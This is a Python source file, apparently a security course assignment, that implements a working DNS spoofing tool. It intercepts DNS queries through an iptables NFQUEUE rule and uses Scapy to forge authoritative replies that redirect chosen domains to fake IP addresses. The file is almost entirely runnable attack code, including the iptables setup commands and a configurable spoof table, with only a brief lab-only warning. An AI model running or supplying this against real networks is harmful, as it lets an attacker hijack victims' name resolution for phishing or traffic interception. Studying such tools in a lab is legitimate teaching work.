#!/usr/bin/env python3
"""
Task 11: DNS Spoofing

Objective: Intercept DNS queries and forge spoofed responses to redirect domains.
Extension: Supports multiple domain-to-IP mappings via a configurable spoof table.

IMPORTANT:
  - Run ONLY in a controlled lab environment (e.g., your own VM / local network).
  - Requires root/sudo privileges.
  - Requires: pip install scapy netfilterqueue
  - Works on Linux with iptables.

HOW IT WORKS:
  1. An iptables rule redirects outgoing DNS packets to a NetfilterQueue (queue #0).
  2. This script reads each queued packet.
  3. If the queried domain matches our spoof table, we forge a DNS reply with a
     fake IP address and send it back — the real DNS server never gets to answer.
  4. All other queries are forwarded unchanged.

SETUP (run before this script):
  sudo iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0
  sudo iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0

TEARDOWN (run after to restore normal DNS):
  sudo iptables -D OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0
  sudo iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0
"""

import sys
import argparse
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, raw

try:
    from netfilterqueue import NetfilterQueue
except ImportError:
    print("[ERROR] netfilterqueue not installed.")
    print("        Install with: pip install netfilterqueue")
    sys.exit(1)


# ---------------------------------------------------------------------------
# Spoof Table: domain (lowercase, with trailing dot) -> fake IP
# Extend this dict to support multiple domains (Extension requirement).
# ---------------------------------------------------------------------------
DEFAULT_SPOOF_TABLE = {
    "example.com.":    "1.2.3.4",
    "malicious.com.":  "10.0.0.1",
    "test.local.":     "192.168.100.50",
}


def build_spoofed_response(original_packet, fake_ip: str):
    """
    Craft a forged DNS response that answers the original query with fake_ip.

    Args:
        original_packet : Scapy IP packet from the queue
        fake_ip         : IP address to return in the spoofed A record

    Returns:
        Raw bytes of the spoofed packet.
    """
    # Flip src/dst so the reply goes back to the original requester
    spoofed = (
        IP(
            src=original_packet[IP].dst,
            dst=original_packet[IP].src
        ) /
        UDP(
            sport=original_packet[UDP].dport,   # 53
            dport=original_packet[UDP].sport    # ephemeral port of client
        ) /
        DNS(
            id=original_packet[DNS].id,         # match the query's transaction ID
            qr=1,                               # this is a Response
            aa=1,                               # authoritative answer
            qd=original_packet[DNS].qd,         # echo back the question section
            an=DNSRR(
                rrname=original_packet[DNS].qd.qname,
                ttl=300,
                rdata=fake_ip
            )
        )
    )
    return raw(spoofed)


def process_packet(packet, spoof_table: dict, verbose: bool) -> None:
    """
    Callback invoked by NetfilterQueue for every intercepted packet.

    Checks if the DNS query matches a spoofed domain; if so, drops the original
    and injects a forged response. Otherwise, accepts and forwards the packet.

    Args:
        packet      : NetfilterQueue packet object
        spoof_table : Mapping of domain -> fake IP
        verbose     : Print info for every packet (not just spoofed ones)
    """
    # Parse packet bytes with Scapy
    scapy_pkt = IP(packet.get_payload())

    # Only handle DNS queries (UDP port 53, QR=0 means query)
    if (
        scapy_pkt.haslayer(DNS) and
        scapy_pkt[DNS].qr == 0 and          # it's a query, not a reply
        scapy_pkt[DNS].qd is not None        # has a question section
    ):
        queried_name = scapy_pkt[DNS].qd.qname.decode().lower()

        if verbose:
            print(f"[DNS Query] {scapy_pkt[IP].src} asked for: {queried_name}")

        # Check against our spoof table
        if queried_name in spoof_table:
            fake_ip = spoof_table[queried_name]
            print(f"[SPOOF] '{queried_name}' -> {fake_ip}  "
                  f"(original from {scapy_pkt[IP].src})")

            # Build and inject the forged response
            spoofed_bytes = build_spoofed_response(scapy_pkt, fake_ip)
            packet.set_payload(spoofed_bytes)

    # Accept/forward the (possibly modified) packet
    packet.accept()


def run(spoof_table: dict, queue_num: int, verbose: bool) -> None:
    """
    Bind to the NetfilterQueue and start processing packets.

    Args:
        spoof_table : Domain -> fake IP mapping
        queue_num   : iptables NFQUEUE number (default 0)
        verbose     : Verbose output flag
    """
    print("\n" + "="*60)
    print("  DNS Spoofing Tool | CS6903 Task 11")
    print("="*60)
    print(f"  Queue  : {queue_num}")
    print(f"  Domains being spoofed ({len(spoof_table)}):")
    for domain, ip in spoof_table.items():
        print(f"    {domain:<30} -> {ip}")
    print("="*60)
    print("  Listening for DNS queries... (Ctrl+C to stop)\n")

    nfqueue = NetfilterQueue()
    # Bind our callback; use a lambda to pass extra args
    nfqueue.bind(queue_num, lambda pkt: process_packet(pkt, spoof_table, verbose))

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        print("\n[*] Stopping DNS spoofer.")
    finally:
        nfqueue.unbind()
        print("[*] Queue unbound. Restore iptables rules if needed:")
        print(f"    sudo iptables -D OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}")
        print(f"    sudo iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}")


def main():
    parser = argparse.ArgumentParser(
        description="Task 11: DNS Spoofing Tool (Scapy + NetfilterQueue)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Before running, set up iptables:\n"
            "  sudo iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0\n"
            "  sudo iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0\n\n"
            "Example:\n"
            "  sudo python3 task11.py\n"
            "  sudo python3 task11.py --spoof example.com=5.5.5.5 test.local=10.0.0.9\n"
            "  sudo python3 task11.py --queue 1 --verbose\n"
        )
    )
    parser.add_argument(
        "--spoof", nargs="*", metavar="DOMAIN=IP",
        help=(
            "One or more domain=IP pairs to spoof.\n"
            "Example: --spoof example.com=1.2.3.4 evil.com=10.0.0.1\n"
            "If not provided, the built-in DEFAULT_SPOOF_TABLE is used."
        )
    )
    parser.add_argument(
        "--queue", type=int, default=0,
        help="NFQUEUE number (must match iptables rule). Default: 0"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Print all DNS queries, not just spoofed ones."
    )

    args = parser.parse_args()

    # Build spoof table
    if args.spoof:
        spoof_table = {}
        for entry in args.spoof:
            try:
                domain, ip = entry.split("=")
                # Ensure trailing dot (DNS FQDN convention)
                domain = domain.strip().lower()
                if not domain.endswith("."):
                    domain += "."
                spoof_table[domain] = ip.strip()
            except ValueError:
                print(f"[ERROR] Invalid spoof entry: '{entry}'. Use DOMAIN=IP format.")
                sys.exit(1)
    else:
        spoof_table = DEFAULT_SPOOF_TABLE

    run(spoof_table, args.queue, args.verbose)


if __name__ == "__main__":
    main()
